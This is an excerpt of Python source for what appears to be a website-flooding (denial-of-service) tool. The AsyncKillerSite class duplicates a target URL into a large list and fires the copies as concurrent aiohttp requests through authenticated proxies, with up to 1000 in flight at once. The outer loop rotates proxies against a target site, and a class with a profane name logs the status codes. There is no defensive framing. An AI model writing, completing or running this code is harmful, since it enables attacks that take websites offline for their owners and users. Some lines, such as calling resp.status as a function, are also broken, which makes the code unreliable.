                ...
                if attack.status_code >= 302:
                    ...
                    for proxy in data['proxy']:
                        ...
                        if response.status_code >= 200 and response.status_code <= 302:
                            ...
                            self.killer.create_requests(site, self.MAX_REQUESTS, proxy)
                        del response
                else:
                    # pass
                    self.killer.create_requests(site, self.MAX_REQUESTS, choice(data['proxy']))
...
class AsyncKillerSite:
    @staticmethod
    async def get_url(client, i, url, proxy):
        async with client.get(url, proxy=proxy) as resp:
            result = await resp.status()
            return result
    ...
    async def run(self, i, url, semaphore, client, proxy):
        async with semaphore:
            status = await self.get_url(client, i, url, proxy)
            FuckYouRussianShip.write_statistic_success(url, status)
            # await fetch_html(url, client)

    async def main(self, url_list, proxy):
        task = []
        semaphore = asyncio.Semaphore(1000)
        proxy = 'http://' + proxy['auth'] + '@' + proxy["ip"],
        async with aiohttp.ClientSession() as client:
            for i, url in enumerate(url_list):
                task.append(self.run(i, url, semaphore, client, proxy))
            await asyncio.gather(*task)

    def create_requests(self, url, total_requests, proxy):
        url_list = [url] * total_requests
        asyncio.run(self.main(url_list, proxy))
